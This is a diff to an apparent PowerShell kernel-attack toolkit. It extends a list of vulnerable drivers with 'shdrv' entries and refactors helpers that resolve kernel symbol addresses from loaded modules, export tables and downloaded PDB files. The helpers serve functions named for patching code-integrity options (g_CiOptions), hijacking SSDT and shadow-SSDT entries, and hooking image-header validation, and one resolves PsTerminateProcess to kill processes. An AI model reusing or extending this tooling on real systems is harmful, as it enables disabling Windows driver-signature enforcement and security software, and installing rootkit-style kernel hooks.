@@ -66,7 +66,7 @@ using namespace System.Windows.Forms
             "ksapi", "ksapi64_dev", "PDFWKRNL", "TPwSav", "WDTKernel",
             "EBIoDispatch", "CcProtect", "EnPortv", "xkpsm", "pcdsrvc_x64",
             "AsrDrv107", "Pmxdrv", "pmxdrv64", "MyPortIO_x64", "MyPortIO0",
-            "athpexnt", "MonProcessEX", "ktapi"
+            "athpexnt", "MonProcessEX", "ktapi", "shdrv_x64", "shdrv"
 
  $Binary | % {
     $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
@@ -248,7 +248,7 @@ return
 # Process < Misc>
 # Get-KernelThreadList /-ProcessID/ 
 # Read-ProcessMemory /-ProcessID / /-Offset/ -BytesToRead 1024 /-OutHex/
-# Read-VirtualAddress -VA (Get-DriverAddress ??) -BlockSize 8 | Format-HexView -Mode 8x
+# Read-VirtualAddress -VA (Resolve-DriverAddress ??) -BlockSize 8 | Format-HexView -Mode 8x
 
 #region Base
 # Scan Kernel Drivers
@@ -5130,7 +5130,7 @@ Function Get-ObRegisterCallback {
 }
 #endregion
 #region gCiOptions
-# Get-FunctionAddress <> based on PowerSploit 3.0.0.0
+# Resolve-SymbolFromFile <> based on PowerSploit 3.0.0.0
 # https://www.powershellgallery.com/packages/PowerSploit/3.0.0.0
 # https://www.powershellgallery.com/packages/PowerSploit/1.0.0.0/Content/PETools%5CGet-PEHeader.ps1
 enum CodeIntegrityOptions {
@@ -5156,12 +5156,12 @@ function Get-gCiOptionsAddress {
         [Int64]$g_CiOptions = 0
     )
 
-    $ciBaseAddress = Get-DriverAddress -DriverName ci.dll
+    $ciBaseAddress = Resolve-DriverAddress -DriverName ci.dll
     if ($ciBaseAddress -eq [IntPtr]::Zero) {
         throw "Could not retrieve runtime kernel base address for ci.dll"
     }
 
-    $FuncAddress = Get-FunctionAddress -DllName ci.dll -FunctionName CiInitialize
+    $FuncAddress = Resolve-SymbolFromFile -DllName ci.dll -FunctionName CiInitialize
 
     $CiInitialize = $FuncAddress.RVA
     if ($null -eq $CiInitialize) {
@@ -5390,30 +5390,356 @@ function Invoke-SeValidateImageHeaderHook {
     }
 }
 #endregion
-#region Helper
-function Get-RVA {
-    param ([string]$Symbol)
+#region RVA
+# RVA From Loaded Handle
+function Resolve-SymbolFromHandle {
+    param (
+        [ValidateNotNullOrEmpty()]
+        [string]$Symbol,
+
+        [string]$Module = 'ntoskrnl.exe'
+    )
     
     # 1. Load the module into memory to read its headers
-    $hModule = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
     $procAddress = [IntPtr]::Zero
+    $hModule = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll $Module
+    if ($hModule -eq $null -or $hModule -eq 0L) {
+        throw "Error fetch module Address"
+    }
+
     $AnsiPtr = Init-NativeString -Value ($Symbol -split "!")[1] -Encoding Ansi
-    
     $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$procAddress, 0, 0) | Out-Null
     Free-NativeString -StringPtr $AnsiPtr
     
     # 2. Calculate RVA = (Absolute Address in Process) - (Base Address in Process)
-    $ModuleBase = $hModule # This is the base address of the module in your process
-    $RVA = $procAddress.ToInt64() - $ModuleBase.ToInt64()
-    
+    $RVA = $procAddress.ToInt64() - $hModule.ToInt64()
     return $RVA
 }
+# RVA From LOCAL File
+function Resolve-SymbolFromFile {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$DllName,
+
+        [Parameter(Mandatory = $true)]
+        [string]$FunctionName,
+
+        [Parameter(Mandatory = $false)]
+        [int]$BytesToRead = 25
+    )
+
+    function Convert-RVAToFileOffset([int]$Rva, [PSObject[]]$SectionHeaders) {
+        foreach ($Section in $SectionHeaders) {
+            if ($Rva -ge $Section.VirtualAddress -and $Rva -lt ($Section.VirtualAddress + $Section.VirtualSize)) {
+                return $Rva - $Section.VirtualAddress + $Section.PointerToRawData
+            }
+        }
+        return $Rva
+    }
+
+    $DllPath = Join-Path -Path $env:windir -ChildPath "System32\$DllName"
+
+    if (-not (Test-Path $DllPath)) {
+        Write-Error "DLL file not found at: $DllPath"
+        return $null
+    }
+
+    $FileByteArray = [System.IO.File]::ReadAllBytes($DllPath)
+    $Handle = [GCHandle]::Alloc($FileByteArray, 'Pinned')
+    $PEBaseAddr = $Handle.AddrOfPinnedObject()
+
+    try {
+        # Parse DOS header
+        $DosHeader = [Marshal]::PtrToStructure($PEBaseAddr, [Type] [PE+_IMAGE_DOS_HEADER])
+        $PointerNtHeader = [IntPtr]($PEBaseAddr.ToInt64() + $DosHeader.e_lfanew)
+
+        # Detect architecture
+        $NtHeader32 = [Marshal]::PtrToStructure($PointerNtHeader, [Type] [PE+_IMAGE_NT_HEADERS32])
+        $Architecture = $NtHeader32.FileHeader.Machine.ToString()
+        $PEStruct = @{}
+
+        if ($Architecture -eq 'AMD64') {
+            $PEStruct['NT_HEADER'] = [PE+_IMAGE_NT_HEADERS64]
+        } elseif ($Architecture -eq 'I386') {
+            $PEStruct['NT_HEADER'] = [PE+_IMAGE_NT_HEADERS32]
+        } else {
+            Write-Error "Unsupported architecture: $Architecture"
+            return $null
+        }
+
+        # Parse correct NT header
+        $NtHeader = [Marshal]::PtrToStructure($PointerNtHeader, [Type] $PEStruct['NT_HEADER'])
+        $NumSections = $NtHeader.FileHeader.NumberOfSections
+
+        # Parse section headers
+        $PointerSectionHeader = [IntPtr] ($PointerNtHeader.ToInt64() + [Marshal]::SizeOf([Type] $PEStruct['NT_HEADER']))
+        $SectionHeaders = New-Object PSObject[]($NumSections)
+        for ($i = 0; $i -lt $NumSections; $i++) {
+            $SectionHeaders[$i] = [Marshal]::PtrToStructure(
+                [IntPtr]($PointerSectionHeader.ToInt64() + ($i * [Marshal]::SizeOf([Type] [PE+_IMAGE_SECTION_HEADER]))),
+                [Type] [PE+_IMAGE_SECTION_HEADER]
+            )
+        }
+
+        # Check for exports
+        if ($NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress -eq 0) {
+            Write-Error "Module does not contain any exports."
+            return $null
+        }
+
+        # Get Export Directory
+        $ExportDirRVA = $NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress
+        $ExportDirOffset = Convert-RVAToFileOffset -Rva $ExportDirRVA -SectionHeaders $SectionHeaders
+        $ExportDirectory = [Marshal]::PtrToStructure(
+            [IntPtr]($PEBaseAddr.ToInt64() + $ExportDirOffset),
+            [Type] [PE+_IMAGE_EXPORT_DIRECTORY]
+        )
+
+        # Export table pointers
+        $AddressOfNamesOffset        = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfNames        -SectionHeaders $SectionHeaders
+        $AddressOfNameOrdinalsOffset = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfNameOrdinals -SectionHeaders $SectionHeaders
+        $AddressOfFunctionsOffset    = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfFunctions    -SectionHeaders $SectionHeaders
+
+        # Loop through exported names to find the function
+        for ($i = 0; $i -lt $ExportDirectory.NumberOfNames; $i++) {
+            $nameRVA = [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfNamesOffset + ($i * 4)))
+            $funcNameOffset = Convert-RVAToFileOffset -Rva $nameRVA -SectionHeaders $SectionHeaders
+            $funcName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $funcNameOffset))
+
+            if ($funcName -eq $FunctionName) {
+                $ordinal = [Marshal]::ReadInt16([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfNameOrdinalsOffset + ($i * 2)))
+                $funcRVA = [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfFunctionsOffset + ($ordinal * 4)))
+
+                # Skip forwarded exports
+                if ($funcRVA -ge $ExportDirRVA -and $funcRVA -lt ($ExportDirRVA + $NtHeader.OptionalHeader.DataDirectory[0].Size)) {
+                    Write-Error "Function '$FunctionName' is a forwarded export and cannot be read."
+                    return $null
+                }
+
+                # Get file offset and extract bytes
+                $funcFileOffset = Convert-RVAToFileOffset -Rva $funcRVA -SectionHeaders $SectionHeaders
+                if ($funcFileOffset -ge $FileByteArray.Length) {
+                    Write-Error "Function RVA points outside the file. Cannot read bytes."
+                    return $null
+                }
+
+                $bytesAvailable = $FileByteArray.Length - $funcFileOffset
+                if ($BytesToRead -gt $bytesAvailable) {
+                    $BytesToRead = $bytesAvailable
+                    Write-Warning "Read would go beyond file size. Reading to end of file ($BytesToRead bytes)."
+                }
+
+                $funcBytes = $FileByteArray[$funcFileOffset..($funcFileOffset + $BytesToRead - 1)]
+                return [PSCustomObject]@{
+                    Name        = $FunctionName
+                    RVA         = $funcRVA
+                    FileOffset  = $funcFileOffset
+                    Bytes       = $funcBytes
+                    StaticBase   = "0x{0:X}" -f $NtHeader.OptionalHeader.ImageBase
+                }
+            }
+        }
+
+        Write-Error "Function '$FunctionName' not found in DLL."
+        return $null
+    } finally {
+        $Handle.Free()
+    }
+}
+# RVA From PDB
+function Resolve-SymbolFromPdb {
+    param (
+        [string]$BinaryPath = "C:\Windows\System32\ntoskrnl.exe",
+        [string]$FunctionName = "MiAllocateVirtualMemory",
+        [string]$DownloadFolder = "C:\Symbols"
+    )
+
+    # 1. Pure Type Generation Reflection
+    try {
+        $Module = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.ManifestModule.ScopeName -eq "PdbRaw" } | select -Last 1
+        $PdbRaw = $Module.GetTypes()[0]
+    }
+    catch {
+        $Module = [AppDomain]::CurrentDomain.DefineDynamicAssembly("null", 1).DefineDynamicModule("PdbRaw", $False).DefineType("null")
+        @(
+            @('SymInitialize',   'dbghelp.dll', [bool],   @([IntPtr], [string], [bool])),
+            @('SymCleanup',      'dbghelp.dll', [bool],   @([IntPtr])),
+            @('SymLoadModuleEx', 'dbghelp.dll', [uint64], @([IntPtr], [IntPtr], [string], [string], [uint64], [uint32], [IntPtr], [uint32])),
+            @('SymFromName',     'dbghelp.dll', [bool],   @([IntPtr], [string], [IntPtr]))
+        ) | % {
+            $Module.DefinePInvokeMethod(($_[0]), ($_[1]), 22, 1, [Type]($_[2]), [Type[]]($_[3]), 1, 3).SetImplementationFlags(128)
+        }
+        $PdbRaw = $Module.CreateType()
+    }
+
+    $index = -1
+    $found = $false
+    $bytes = [System.IO.File]::ReadAllBytes($BinaryPath)
+    $ms    = [System.IO.MemoryStream]::new($bytes)
+    $br    = [System.IO.BinaryReader]::new($ms)
+
+    while(($index = [Array]::IndexOf($bytes, [byte]0x52, $index + 1)) -ge 0)
+    {
+        # Verify "RSDS"
+        if(
+            $index + 24 -gt $bytes.Length -or
+            $bytes[$index + 1] -ne 0x53 -or
+            $bytes[$index + 2] -ne 0x44 -or
+            $bytes[$index + 3] -ne 0x53
+        ){
+            continue
+        }
+
+        # Read candidate RSDS record
+        $ms.Position = $index + 4      # Skip "RSDS"
+        $guid = (New-Object Guid (,$br.ReadBytes(16))).ToString("N").ToUpper()
+        $age  = $br.ReadUInt32()
+        $sb = [System.Text.StringBuilder]::new()
+
+        while($ms.Position -lt $ms.Length)
+        {
+            $b = $br.ReadByte()
+            if($b -eq 0){ break }
+            [void]$sb.Append([char]$b)
+        }
+
+        $name = Split-Path $sb.ToString() -Leaf
+
+        if(
+            $age -gt 0 -and
+            $name.Length -gt 4 -and
+            $name.Length -lt 260 -and
+            $name -cmatch '^[ -~]+\.pdb$'
+        ){
+            $pdbName = $name
+            $found = $true
+            break
+        }
+    }
+
+    $br.Close()
+    $ms.Close()
+
+    if(-not $found){
+        throw "Valid RSDS record not found."
+    }
+
+    # 3. Handle local cache check or download
+    $destination = Join-Path $DownloadFolder "$pdbName\$guid$age\$pdbName"
+    if (-not (Test-Path $destination)) {
+        Write-Host "PDB missing locally. Downloading..." -ForegroundColor Yellow
+        New-Item -ItemType Directory -Path (Split-Path $destination) -Force | Out-Null
+        $url = "https://msdl.microsoft.com/download/symbols/$pdbName/$guid$age/$pdbName"
+        Invoke-WebRequest -Uri $url -OutFile $destination -UserAgent "Microsoft-Symbol-Server/10.0.0.0"
+    }
+
+    # 4. Invoke PInvoke APIs via PdbRaw Methods
+    # FIX: Use the current process handle instead of a random integer to guarantee initialization context
+    $hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle
+    
+    $fs = [System.IO.File]::OpenRead($BinaryPath)
+    $br = New-Object System.IO.BinaryReader($fs)
+
+    # 1. Read DOS header offset (e_lfanew is at 0x3C)
+    $fs.Position = 0x3C
+    $e_lfanew = $br.ReadInt32()
+
+    # 2. Check the Magic to confirm architecture (at offset e_lfanew + 24)
+    $fs.Position = $e_lfanew + 24
+    $magic = $br.ReadUInt16()
+
+    # 3. Read the clean ImageBase
+    if ($magic -eq 0x20B) { 
+        # 64-bit (PE32+): ImageBase is a UInt64 at offset e_lfanew + 48
+        $fs.Position = $e_lfanew + 48
+        $dummyBase = $br.ReadUInt64()
+    } else { 
+        # 32-bit (PE32): ImageBase is a UInt32 at offset e_lfanew + 52
+        $fs.Position = $e_lfanew + 52
+        $dummyBase = [uint64]$br.ReadUInt32()
+    }
+
+    $br.Close()
+    $fs.Close()
+
+    # FIX: Ensure SymInitialize is passed true or the local target directory to register the module context properly
+    $PdbDir = Split-Path $destination
+    [void]$PdbRaw::SymInitialize($hProcess, $PdbDir, $false)
+    
+    # Load the module layout cleanly
+    $modBase = $PdbRaw::SymLoadModuleEx($hProcess, [IntPtr]::Zero, $destination, $null, $dummyBase, [uint32]0, [IntPtr]::Zero, [uint32]0)
+
+    if ($modBase -eq 0) {
+        [void]$PdbRaw::SymCleanup($hProcess)
+        throw "Failed to load module inside dbghelp. Ensure the PDB target matches your architecture."
+    }
+
+    # FIX: Standardized unmanaged allocation via native Marshal instead of custom commandlets
+    $BufferSize = 88 + 2000
+    $pSymbolInfo = New-IntPtr -Size $BufferSize -InitialValue 88
+    [Marshal]::WriteInt32($pSymbolInfo, 76, 2000)
+
+    # Run the symbol search
+    $matched = $PdbRaw::SymFromName($hProcess, $FunctionName, $pSymbolInfo)
+
+    if ($matched) {
+        $AbsoluteAddress = [Marshal]::ReadInt64($pSymbolInfo, 56) # Offset 56 = Address
+        $offset = [int64]($AbsoluteAddress - $dummyBase)
+        $result = $offset
+    } else {
+        $result = $null
+    }
+
+    # Cleanup memory and symbol paths
+    [Marshal]::FreeHGlobal($pSymbolInfo)
+    [void]$PdbRaw::SymCleanup($hProcess)
+
+    if ($null -ne $result) { return $result } else { throw "Function '$FunctionName' not found." }
+}
+# Get Loaded Driver Address
+function Resolve-DriverAddress {
+    param (
+        [string]$DriverName
+    )
+
+    [Int32]$sz = 0
+    $structSize = 272
+    if ($NtApi::RtlQueryModuleInformation([ref]$sz, $structSize, [IntPtr]::Zero) -eq 0 -and $sz -gt 0) {
+        $buf = [Marshal]::AllocHGlobal($sz)   
+        if ($NtApi::RtlQueryModuleInformation([ref]$sz, $structSize, $buf) -eq 0) {       
+            $moduleCount = $sz / $structSize
+            for ($i = 0; $i -lt $moduleCount; $i++) {
+
+                # Calculate the starting point of the current module structure
+                $currentPtr = [IntPtr]([Int64]$buf + ($i * $structSize))
+
+                # Offset 0: Image Base Address
+                $imageBase = [Marshal]::ReadIntPtr($currentPtr, 0)
+
+                # Offset 16: Image Name String (Null-terminated ASCII)
+                $namePtr = [IntPtr]([Int64]$currentPtr + 16)
+                $imageName = [Marshal]::PtrToStringAnsi($namePtr)
+
+                # Check if this module is CI.dll
+                if ($imageName -like "*$DriverName*") {
+                   #Write-Warning "FOund Image Name $imageName"
+                    return $imageBase
+                }
+            }
+        }
+        [Marshal]::FreeHGlobal($buf)
+    }
+    throw "Could not retrieve runtime kernel base address for $DriverName"
+}
+#endregion
+#region Helper
 function Get-NtBuildNumber {
     $KernelBase = Get-KernelBaseAddress
     
     # 1. Resolve function (PsGetVersion)
     # Using your approach, find the RVA of PsGetVersion
-    $PsGetVersionRVA = Get-RVA -Symbol "nt!PsGetVersion" 
+    $PsGetVersionRVA = Resolve-SymbolFromHandle -Symbol "nt!PsGetVersion" 
     $PsGetVersionVA = [IntPtr]::Add($KernelBase, $PsGetVersionRVA)
     
     # 2. Map the memory buffer
@@ -5791,261 +6117,6 @@ function Get-ObjectManagerDirectory {
         Write-Error $_.Exception.Message
     }
 }
-function Get-FunctionAddress {
-    [CmdletBinding()]
-    param (
-        [Parameter(Mandatory = $true)]
-        [string]$DllName,
-
-        [Parameter(Mandatory = $true)]
-        [string]$FunctionName,
-
-        [Parameter(Mandatory = $false)]
-        [int]$BytesToRead = 25
-    )
-
-    function Convert-RVAToFileOffset([int]$Rva, [PSObject[]]$SectionHeaders) {
-        foreach ($Section in $SectionHeaders) {
-            if ($Rva -ge $Section.VirtualAddress -and $Rva -lt ($Section.VirtualAddress + $Section.VirtualSize)) {
-                return $Rva - $Section.VirtualAddress + $Section.PointerToRawData
-            }
-        }
-        return $Rva
-    }
-
-    $DllPath = Join-Path -Path $env:windir -ChildPath "System32\$DllName"
-
-    if (-not (Test-Path $DllPath)) {
-        Write-Error "DLL file not found at: $DllPath"
-        return $null
-    }
-
-    $FileByteArray = [System.IO.File]::ReadAllBytes($DllPath)
-    $Handle = [GCHandle]::Alloc($FileByteArray, 'Pinned')
-    $PEBaseAddr = $Handle.AddrOfPinnedObject()
-
-    try {
-        # Parse DOS header
-        $DosHeader = [Marshal]::PtrToStructure($PEBaseAddr, [Type] [PE+_IMAGE_DOS_HEADER])
-        $PointerNtHeader = [IntPtr]($PEBaseAddr.ToInt64() + $DosHeader.e_lfanew)
-
-        # Detect architecture
-        $NtHeader32 = [Marshal]::PtrToStructure($PointerNtHeader, [Type] [PE+_IMAGE_NT_HEADERS32])
-        $Architecture = $NtHeader32.FileHeader.Machine.ToString()
-        $PEStruct = @{}
-
-        if ($Architecture -eq 'AMD64') {
-            $PEStruct['NT_HEADER'] = [PE+_IMAGE_NT_HEADERS64]
-        } elseif ($Architecture -eq 'I386') {
-            $PEStruct['NT_HEADER'] = [PE+_IMAGE_NT_HEADERS32]
-        } else {
-            Write-Error "Unsupported architecture: $Architecture"
-            return $null
-        }
-
-        # Parse correct NT header
-        $NtHeader = [Marshal]::PtrToStructure($PointerNtHeader, [Type] $PEStruct['NT_HEADER'])
-        $NumSections = $NtHeader.FileHeader.NumberOfSections
-
-        # Parse section headers
-        $PointerSectionHeader = [IntPtr] ($PointerNtHeader.ToInt64() + [Marshal]::SizeOf([Type] $PEStruct['NT_HEADER']))
-        $SectionHeaders = New-Object PSObject[]($NumSections)
-        for ($i = 0; $i -lt $NumSections; $i++) {
-            $SectionHeaders[$i] = [Marshal]::PtrToStructure(
-                [IntPtr]($PointerSectionHeader.ToInt64() + ($i * [Marshal]::SizeOf([Type] [PE+_IMAGE_SECTION_HEADER]))),
-                [Type] [PE+_IMAGE_SECTION_HEADER]
-            )
-        }
-
-        # Check for exports
-        if ($NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress -eq 0) {
-            Write-Error "Module does not contain any exports."
-            return $null
-        }
-
-        # Get Export Directory
-        $ExportDirRVA = $NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress
-        $ExportDirOffset = Convert-RVAToFileOffset -Rva $ExportDirRVA -SectionHeaders $SectionHeaders
-        $ExportDirectory = [Marshal]::PtrToStructure(
-            [IntPtr]($PEBaseAddr.ToInt64() + $ExportDirOffset),
-            [Type] [PE+_IMAGE_EXPORT_DIRECTORY]
-        )
-
-        # Export table pointers
-        $AddressOfNamesOffset        = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfNames        -SectionHeaders $SectionHeaders
-        $AddressOfNameOrdinalsOffset = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfNameOrdinals -SectionHeaders $SectionHeaders
-        $AddressOfFunctionsOffset    = Convert-RVAToFileOffset -Rva $ExportDirectory.AddressOfFunctions    -SectionHeaders $SectionHeaders
-
-        # Loop through exported names to find the function
-        for ($i = 0; $i -lt $ExportDirectory.NumberOfNames; $i++) {
-            $nameRVA = [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfNamesOffset + ($i * 4)))
-            $funcNameOffset = Convert-RVAToFileOffset -Rva $nameRVA -SectionHeaders $SectionHeaders
-            $funcName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $funcNameOffset))
-
-            if ($funcName -eq $FunctionName) {
-                $ordinal = [Marshal]::ReadInt16([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfNameOrdinalsOffset + ($i * 2)))
-                $funcRVA = [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $AddressOfFunctionsOffset + ($ordinal * 4)))
-
-                # Skip forwarded exports
-                if ($funcRVA -ge $ExportDirRVA -and $funcRVA -lt ($ExportDirRVA + $NtHeader.OptionalHeader.DataDirectory[0].Size)) {
-                    Write-Error "Function '$FunctionName' is a forwarded export and cannot be read."
-                    return $null
-                }
-
-                # Get file offset and extract bytes
-                $funcFileOffset = Convert-RVAToFileOffset -Rva $funcRVA -SectionHeaders $SectionHeaders
-                if ($funcFileOffset -ge $FileByteArray.Length) {
-                    Write-Error "Function RVA points outside the file. Cannot read bytes."
-                    return $null
-                }
-
-                $bytesAvailable = $FileByteArray.Length - $funcFileOffset
-                if ($BytesToRead -gt $bytesAvailable) {
-                    $BytesToRead = $bytesAvailable
-                    Write-Warning "Read would go beyond file size. Reading to end of file ($BytesToRead bytes)."
-                }
-
-                $funcBytes = $FileByteArray[$funcFileOffset..($funcFileOffset + $BytesToRead - 1)]
-                return [PSCustomObject]@{
-                    Name        = $FunctionName
-                    RVA         = $funcRVA
-                    FileOffset  = $funcFileOffset
-                    Bytes       = $funcBytes
-                    StaticBase   = "0x{0:X}" -f $NtHeader.OptionalHeader.ImageBase
-                }
-            }
-        }
-
-        Write-Error "Function '$FunctionName' not found in DLL."
-        return $null
-    } finally {
-        $Handle.Free()
-    }
-}
-function Get-DriverAddress {
-    param (
-        [string]$DriverName
-    )
-
-    [Int32]$sz = 0
-    $structSize = 272
-    if ($NtApi::RtlQueryModuleInformation([ref]$sz, $structSize, [IntPtr]::Zero) -eq 0 -and $sz -gt 0) {
-        $buf = [Marshal]::AllocHGlobal($sz)   
-        if ($NtApi::RtlQueryModuleInformation([ref]$sz, $structSize, $buf) -eq 0) {       
-            $moduleCount = $sz / $structSize
-            for ($i = 0; $i -lt $moduleCount; $i++) {
-
-                # Calculate the starting point of the current module structure
-                $currentPtr = [IntPtr]([Int64]$buf + ($i * $structSize))
-
-                # Offset 0: Image Base Address
-                $imageBase = [Marshal]::ReadIntPtr($currentPtr, 0)
-
-                # Offset 16: Image Name String (Null-terminated ASCII)
-                $namePtr = [IntPtr]([Int64]$currentPtr + 16)
-                $imageName = [Marshal]::PtrToStringAnsi($namePtr)
-
-                # Check if this module is CI.dll
-                if ($imageName -like "*$DriverName*") {
-                   #Write-Warning "FOund Image Name $imageName"
-                    return $imageBase
-                }
-            }
-        }
-        [Marshal]::FreeHGlobal($buf)
-    }
-    throw "Could not retrieve runtime kernel base address for $DriverName"
-}
-function Get-PdbSymbolOffset {
-    param (
-        [string]$BinaryPath = "C:\Windows\System32\ntoskrnl.exe",
-        [string]$FunctionName = "MiAllocateVirtualMemory",
-        [string]$DownloadFolder = "C:\Symbols"
-    )
-
-    # 1. Pure Type Generation Reflection
-    try {
-        $Module = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.ManifestModule.ScopeName -eq "PdbRaw" } | select -Last 1
-        $PdbRaw = $Module.GetTypes()[0]
-    }
-    catch {
-        $Module = [AppDomain]::CurrentDomain.DefineDynamicAssembly("null", 1).DefineDynamicModule("PdbRaw", $False).DefineType("null")
-        @(
-            @('SymInitialize', 'dbghelp.dll', [bool],   @([IntPtr], [string], [bool])),
-            @('SymCleanup',    'dbghelp.dll', [bool],   @([IntPtr])),
-            @('SymLoadModuleEx','dbghelp.dll', [uint64], @([IntPtr], [IntPtr], [string], [string], [uint64], [uint32], [IntPtr], [uint32])),
-            @('SymFromName',   'dbghelp.dll', [bool],   @([IntPtr], [string], [IntPtr]))
-        ) | % {
-            $Module.DefinePInvokeMethod(($_[0]), ($_[1]), 22, 1, [Type]($_[2]), [Type[]]($_[3]), 1, 3).SetImplementationFlags(128)
-        }
-        $PdbRaw = $Module.CreateType()
-    }
-
-    # 2. Extract RSDS details from Binary via BinaryReader
-    $fs = [System.IO.File]::OpenRead($BinaryPath)
-    $br = New-Object System.IO.BinaryReader($fs)
-    $found = $false
-    while ($fs.Position -lt ($fs.Length - 24)) {
-        if ($br.ReadUInt32() -eq 0x53445352) { $found = $true; break }
-        $fs.Position -= 3
-    }
-    if (-not $found) { $br.Close(); $fs.Close(); throw "RSDS signature not found." }
-
-    $guid = (New-Object System.Guid(,$br.ReadBytes(16))).ToString("N").ToUpper()
-    $age = $br.ReadUInt32()
-    $sb = New-Object System.Text.StringBuilder
-    while (($b = $br.ReadByte()) -ne 0) { [void]$sb.Append([char]$b) }
-    $pdbName = Split-Path $sb.ToString() -Leaf
-    $br.Close(); $fs.Close()
-
-    # 3. Handle local cache check or download
-    $destination = Join-Path $DownloadFolder "$pdbName\$guid$age\$pdbName"
-    if (-not (Test-Path $destination)) {
-        Write-Host "PDB missing locally. Downloading..." -ForegroundColor Yellow
-        New-Item -ItemType Directory -Path (Split-Path $destination) -Force | Out-Null
-        $url = "https://msdl.microsoft.com/download/symbols/$pdbName/$guid$age/$pdbName"
-        Invoke-WebRequest -Uri $url -OutFile $destination -UserAgent "Microsoft-Symbol-Server/10.0.0.0"
-    }
-
-    # 4. Invoke PInvoke APIs via PdbRaw Methods
-    # FIX: Use the current process handle instead of a random integer to guarantee initialization context
-    $hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle
-    $dummyBase = [uint64]0x10000000
-
-    # FIX: Ensure SymInitialize is passed true or the local target directory to register the module context properly
-    $PdbDir = Split-Path $destination
-    [void]$PdbRaw::SymInitialize($hProcess, $PdbDir, $false)
-    
-    # Load the module layout cleanly
-    $modBase = $PdbRaw::SymLoadModuleEx($hProcess, [IntPtr]::Zero, $destination, $null, $dummyBase, [uint32]0, [IntPtr]::Zero, [uint32]0)
-
-    if ($modBase -eq 0) {
-        [void]$PdbRaw::SymCleanup($hProcess)
-        throw "Failed to load module inside dbghelp. Ensure the PDB target matches your architecture."
-    }
-
-    # FIX: Standardized unmanaged allocation via native Marshal instead of custom commandlets
-    $BufferSize = 88 + 2000
-    $pSymbolInfo = New-IntPtr -Size $BufferSize -InitialValue 88
-    [Marshal]::WriteInt32($pSymbolInfo, 76, 2000)
-
-    # Run the symbol search
-    $matched = $PdbRaw::SymFromName($hProcess, $FunctionName, $pSymbolInfo)
-
-    if ($matched) {
-        $AbsoluteAddress = [Marshal]::ReadInt64($pSymbolInfo, 56) # Offset 56 = Address
-        $offset = [int64]($AbsoluteAddress - $dummyBase)
-        $result = "0x$($offset.ToString("X"))"
-    } else {
-        $result = $null
-    }
-
-    # Cleanup memory and symbol paths
-    [Marshal]::FreeHGlobal($pSymbolInfo)
-    [void]$PdbRaw::SymCleanup($hProcess)
-
-    if ($null -ne $result) { return $result } else { throw "Function '$FunctionName' not found." }
-}
 function Find-RipRelativeAddress {
     param (
         [Parameter(Mandatory=$true)]
@@ -6105,9 +6176,9 @@ Function Invoke-SsdtCallbackHijack {
     # 1. EXECUTE EXISTING DYNAMIC SSDT RESOLUTION
     # -----------------------------------------------------------------
 
-    $DriverBase = Get-DriverAddress   -DriverName $Driver
-    $TableRVA   = Get-FunctionAddress -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
-    $StubRVA    = Get-FunctionAddress -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
+    $DriverBase = Resolve-DriverAddress   -DriverName $Driver
+    $TableRVA   = Resolve-SymbolFromFile -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
+    $StubRVA    = Resolve-SymbolFromFile -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
 
     $TableVA    = [IntPtr]::Add($DriverBase, $TableRVA)
     $StubVA     = [IntPtr]::Add($DriverBase, $StubRVA)
@@ -6142,7 +6213,7 @@ Function Invoke-SsdtCallbackHijack {
 
     try {
     
-        $RVA = Get-PdbSymbolOffset -FunctionName $Function
+        $RVA = Resolve-SymbolFromPdb -FunctionName $Function
         if ($RVA -eq $null -or $RVA -le 0) {
             throw "Could not locate PsTerminateProcess RVA"
         }
@@ -6802,9 +6873,9 @@ Function Invoke-ShadowSsdtHookKill {
     # 1. EXECUTE EXISTING DYNAMIC SSDT RESOLUTION
     # -----------------------------------------------------------------
 
-    $DriverBase = Get-DriverAddress   -DriverName $Driver
-    $TableRVA   = Get-FunctionAddress -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
-    $StubRVA    = Get-FunctionAddress -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
+    $DriverBase = Resolve-DriverAddress   -DriverName $Driver
+    $TableRVA   = Resolve-SymbolFromFile -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
+    $StubRVA    = Resolve-SymbolFromFile -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
 
     $TableVA    = [IntPtr]::Add($DriverBase, $TableRVA)
     $StubVA     = [IntPtr]::Add($DriverBase, $StubRVA)
@@ -6839,7 +6910,7 @@ Function Invoke-ShadowSsdtHookKill {
 
     try {
     
-        $RVA = Get-PdbSymbolOffset -FunctionName PsTerminateProcess
+        $RVA = Resolve-SymbolFromPdb -FunctionName PsTerminateProcess
